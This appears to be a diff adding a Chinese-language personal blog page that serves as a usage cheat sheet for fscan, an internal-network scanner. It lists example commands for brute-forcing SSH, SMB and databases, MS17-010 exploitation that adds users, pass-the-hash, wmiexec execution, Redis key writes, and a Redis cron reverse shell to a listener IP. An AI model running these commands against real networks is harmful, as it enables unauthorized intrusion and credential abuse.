@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="generator" content="VuePress 2.0.0-rc.0">
+    <style>
+      :root {
+        --c-bg: #fff;
+      }
+      html.dark {
+        --c-bg: #22272e;
+      }
+      html, body {
+        background-color: var(--c-bg);
+      }
+    </style>
+    <script>
+      const userMode = localStorage.getItem('vuepress-color-scheme');
+			const systemDarkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
+			if (userMode === 'dark' || (userMode !== 'light' && systemDarkMode)) {
+				document.documentElement.classList.toggle('dark', true);
+			}
+    </script>
+    <style>
+          body {
+            background-image: url('/bg.png');
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            background-size: cover;
+          }
+        </style><title>fscan基本使用 | Welcome to Five_Three's page!</title><meta name="description" content="个人博客">
+    <link rel="preload" href="/assets/style-pBmjJHNx.css" as="style"><link rel="stylesheet" href="/assets/style-pBmjJHNx.css">
+    <link rel="modulepreload" href="/assets/app-K9ada_Hb.js"><link rel="modulepreload" href="/assets/fscan基本使用.html-qeLLO_fy.js"><link rel="modulepreload" href="/assets/fscan基本使用.html-zO10if8o.js">
+    <link rel="prefetch" href="/assets/index.html-Cgvqf9KF.js" as="script"><link rel="prefetch" href="/assets/ARP协议思考.html-K_Ksl8nB.js" as="script"><link rel="prefetch" href="/assets/Cobalt Strike常用命令.html-NP4dNU-v.js" as="script"><link rel="prefetch" href="/assets/GFW研究.html-VOa58uJO.js" as="script"><link rel="prefetch" href="/assets/Github博客搭建.html-r_ysFl3H.js" as="script"><link rel="prefetch" href="/assets/git配置.html--yb9zucP.js" as="script"><link rel="prefetch" href="/assets/socks5.html-kr9Ffpt1.js" as="script"><link rel="prefetch" href="/assets/wireshark常用语法.html-_1m5abIg.js" as="script"><link rel="prefetch" href="/assets/路由表配置.html-XADuF8Kh.js" as="script"><link rel="prefetch" href="/assets/404.html-6Yl8cQE3.js" as="script"><link rel="prefetch" href="/assets/index.html-dy68rugw.js" as="script"><link rel="prefetch" href="/assets/ARP协议思考.html-3RT3mrIc.js" as="script"><link rel="prefetch" href="/assets/Cobalt Strike常用命令.html-JWctp7xW.js" as="script"><link rel="prefetch" href="/assets/GFW研究.html-X1t8cXts.js" as="script"><link rel="prefetch" href="/assets/Github博客搭建.html-bCggHPAH.js" as="script"><link rel="prefetch" href="/assets/git配置.html-QLjSddiv.js" as="script"><link rel="prefetch" href="/assets/socks5.html-Z3ARl3ZI.js" as="script"><link rel="prefetch" href="/assets/wireshark常用语法.html-zbraLUAH.js" as="script"><link rel="prefetch" href="/assets/路由表配置.html-j_IiSy9n.js" as="script"><link rel="prefetch" href="/assets/404.html-7_Z1FPwt.js" as="script">
+  </head>
+  <body>
+    <div id="app"><!--[--><div class="theme-container"><!--[--><header class="navbar"><div class="toggle-sidebar-button" title="toggle sidebar" aria-expanded="false" role="button" tabindex="0"><div class="icon" aria-hidden="true"><span></span><span></span><span></span></div></div><span><a href="/" class=""><!----><span class="site-name">Welcome to Five_Three&#39;s page!</span></a></span><div class="navbar-items-wrapper" style=""><!--[--><!--]--><!----><!--[--><!--]--><button class="toggle-color-mode-button" title="toggle color mode"><svg style="" class="icon" focusable="false" viewBox="0 0 32 32"><path d="M16 12.005a4 4 0 1 1-4 4a4.005 4.005 0 0 1 4-4m0-2a6 6 0 1 0 6 6a6 6 0 0 0-6-6z" fill="currentColor"></path><path d="M5.394 6.813l1.414-1.415l3.506 3.506L8.9 10.318z" fill="currentColor"></path><path d="M2 15.005h5v2H2z" fill="currentColor"></path><path d="M5.394 25.197L8.9 21.691l1.414 1.415l-3.506 3.505z" fill="currentColor"></path><path d="M15 25.005h2v5h-2z" fill="currentColor"></path><path d="M21.687 23.106l1.414-1.415l3.506 3.506l-1.414 1.414z" fill="currentColor"></path><path d="M25 15.005h5v2h-5z" fill="currentColor"></path><path d="M21.687 8.904l3.506-3.506l1.414 1.415l-3.506 3.505z" fill="currentColor"></path><path d="M15 2.005h2v5h-2z" fill="currentColor"></path></svg><svg style="display:none;" class="icon" focusable="false" viewBox="0 0 32 32"><path d="M13.502 5.414a15.075 15.075 0 0 0 11.594 18.194a11.113 11.113 0 0 1-7.975 3.39c-.138 0-.278.005-.418 0a11.094 11.094 0 0 1-3.2-21.584M14.98 3a1.002 1.002 0 0 0-.175.016a13.096 13.096 0 0 0 1.825 25.981c.164.006.328 0 .49 0a13.072 13.072 0 0 0 10.703-5.555a1.01 1.01 0 0 0-.783-1.565A13.08 13.08 0 0 1 15.89 4.38A1.015 1.015 0 0 0 14.98 3z" fill="currentColor"></path></svg></button><!----></div></header><!--]--><div class="sidebar-mask"></div><!--[--><aside class="sidebar"><!----><!--[--><!--]--><ul class="sidebar-items"><!--[--><li><p tabindex="0" class="sidebar-item sidebar-heading">fscan基本使用 <!----></p><ul style="" class="sidebar-item-children"><!--[--><li><a aria-current="page" href="/docs/fscan%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8.html#基本功能" class="router-link-active router-link-exact-active sidebar-item" aria-label="基本功能"><!--[--><!--]--> 基本功能 <!--[--><!--]--></a><!----></li><!--]--></ul></li><!--]--></ul><!--[--><!--]--></aside><!--]--><!--[--><main class="page"><!--[--><!--]--><div class="theme-default-content"><!--[--><!--]--><div><h1 id="fscan基本使用" tabindex="-1"><a class="header-anchor" href="#fscan基本使用" aria-hidden="true">#</a> fscan基本使用</h1><h2 id="基本功能" tabindex="-1"><a class="header-anchor" href="#基本功能" aria-hidden="true">#</a> 基本功能</h2><blockquote><p><a href="https://blog.csdn.net/qq_30890029/article/details/130969584" target="_blank" rel="noopener noreferrer">fscan使用语法_fscan 不进行探活-CSDN博客<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p></blockquote><p>1.信息搜集:</p><p>存活探测(icmp) 端口扫描 2.爆破功能:</p><p>各类服务爆破(ssh、smb、rdp等) 数据库密码爆破(mysql、mssql、redis、psql、oracle等) 3.系统信息、漏洞扫描:</p><p>netbios探测、域控识别 获取目标网卡信息 高危漏洞扫描(ms17010等) 4.Web探测功能:</p><p>webtitle探测 web指纹识别(常见cms、oa框架等) web漏洞扫描(weblogic、st2等,支持xray的poc) 5.漏洞利用:</p><p>redis写公钥或写计划任务 ssh命令执行 ms17017利用(植入shellcode),如添加用户等 6.其他功能:</p><p>文件保存</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>fscan.exe -h 192.168.1.1/24  (默认使用全部模块)
+fscan.exe -h 192.168.1.1/16  (B段扫描)
+fscan.exe -h 192.168.1.1/24 -np -no -nopoc(跳过存活检测 、不保存文件、跳过web poc扫描)
+fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub (redis 写公钥)
+fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 (redis 计划任务反弹shell)
+fscan.exe -h 192.168.1.1/24 -c whoami (ssh 爆破成功后，命令执行)
+fscan.exe -h 192.168.1.1/24 -m ssh -p 2222 (指定模块ssh和端口)
+fscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt (加载指定文件的用户名、密码来进行爆破)
+fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt (指定扫描结果保存路径,默认保存在当前路径) 
+fscan.exe -h 192.168.1.1/8  (A段的192.x.x.1和192.x.x.254,方便快速查看网段信息 )
+fscan.exe -h 192.168.1.1/24 -m smb -pwd password (smb密码碰撞)
+fscan.exe -h 192.168.1.1/24 -m ms17010 (指定模块)
+fscan.exe -hf ip.txt  (以文件导入)
+fscan.exe -u http://baidu.com -proxy 8080 (扫描单个url,并设置http代理 http://127.0.0.1:8080)
+fscan.exe -h 192.168.1.1/24 -nobr -nopoc (不进行爆破,不扫Web poc,以减少流量)
+fscan.exe -h 192.168.1.1/24 -pa 3389 (在原基础上,加入3389-&gt;rdp扫描)
+fscan.exe -h 192.168.1.1/24 -socks5 127.0.0.1:1080 (只支持简单tcp功能的代理,部分功能的库不支持设置代理)
+fscan.exe -h 192.168.1.1/24 -m ms17010 -sc add (内置添加用户等功能,只适用于备选工具,更推荐其他ms17010的专项利用工具)
+fscan.exe -h 192.168.1.1/24 -m smb2 -user admin -hash xxxxx (pth hash碰撞,xxxx:ntlmhash,如32ed87bdb5fdc5e9cba88547376818d4)
+fscan.exe -h 192.168.1.1/24 -m wmiexec -user admin -pwd password -c xxxxx (wmiexec无回显命令执行)
+</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>完整参数：</p><blockquote><p><a href="https://www.cnblogs.com/nanhe7/p/15966742.html" target="_blank" rel="noopener noreferrer">【工具命令】常用扫描工具-Fscan（内网扫描） - NanHe7 - 博客园 (cnblogs.com)<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p></blockquote><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>  -c string
+        ssh命令执行
+  -cookie string
+        设置cookie
+  -debug int
+        多久没响应,就打印当前进度(default 60)
+  -domain string
+        smb爆破模块时,设置域名
+  -h string
+        目标ip: 192.168.11.11 | 192.168.11.11-255 | 192.168.11.11,192.168.11.12
+  -hf string
+        读取文件中的目标
+  -hn string
+        扫描时,要跳过的ip: -hn 192.168.1.1/24
+  -m string
+        设置扫描模式: -m ssh (default &quot;all&quot;)
+  -no
+        扫描结果不保存到文件中
+  -nobr
+        跳过sql、ftp、ssh等的密码爆破
+  -nopoc
+        跳过web poc扫描
+  -np
+        跳过存活探测
+  -num int
+        web poc 发包速率  (default 20)
+  -o string
+        扫描结果保存到哪 (default &quot;result.txt&quot;)
+  -p string
+        设置扫描的端口: 22 | 1-65535 | 22,80,3306 (default &quot;21,22,80,81,135,139,443,445,1433,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017&quot;)
+  -pa string
+        新增需要扫描的端口,-pa 3389 (会在原有端口列表基础上,新增该端口)
+  -path string
+        fcgi、smb romote file path
+  -ping
+        使用ping代替icmp进行存活探测
+  -pn string
+        扫描时要跳过的端口,as: -pn 445
+  -pocname string
+        指定web poc的模糊名字, -pocname weblogic
+  -proxy string
+        设置代理, -proxy http://127.0.0.1:8080
+  -user string
+        指定爆破时的用户名
+  -userf string
+        指定爆破时的用户名文件
+  -pwd string
+        指定爆破时的密码
+  -pwdf string
+        指定爆破时的密码文件
+  -rf string
+        指定redis写公钥用模块的文件 (as: -rf id_rsa.pub)
+  -rs string
+        redis计划任务反弹shell的ip端口 (as: -rs 192.168.1.1:6666)
+  -silent
+        静默扫描,适合cs扫描时不回显
+  -sshkey string
+        ssh连接时,指定ssh私钥
+  -t int
+        扫描线程 (default 600)
+  -time int
+        端口扫描超时时间 (default 3)
+  -u string
+        指定Url扫描
+  -uf string
+        指定Url文件扫描
+  -wt int
+        web访问超时时间 (default 5)
+</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></div><!--[--><!--]--></div><footer class="page-meta"><!----><div class="meta-item last-updated"><span class="meta-item-label">Last Updated: </span><!----></div><div class="meta-item contributors"><span class="meta-item-label">Contributors: </span><span class="meta-item-info"><!--[--><!--[--><span class="contributor" title="email: zjdwsxy@163.com">five-three</span><!----><!--]--><!--]--></span></div></footer><!----><!--[--><!--]--></main><!--]--></div><!----><!--]--></div>
+    <script type="module" src="/assets/app-K9ada_Hb.js" defer></script>
+  </body>
+</html>
